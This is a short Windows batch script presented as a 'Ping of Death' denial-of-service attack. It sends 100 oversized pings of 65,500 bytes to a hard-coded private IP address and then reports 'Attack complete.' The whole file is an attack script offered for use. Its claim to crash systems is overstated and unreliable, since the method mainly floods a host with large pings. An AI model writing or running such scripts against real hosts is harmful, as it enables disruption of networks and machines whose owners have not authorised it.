@echo off
:: ==========================================
:: Ping of Death (DoS)
:: This script sends a ping with a payload that could potentially crash older systems.
:: ==========================================

:: Define target IP
set target_ip=192.168.1.100

echo Sending Ping of Death to %target_ip%...

:: Send oversized ping
ping -l 65500 -n 100 %target_ip%

echo Attack complete.
pause
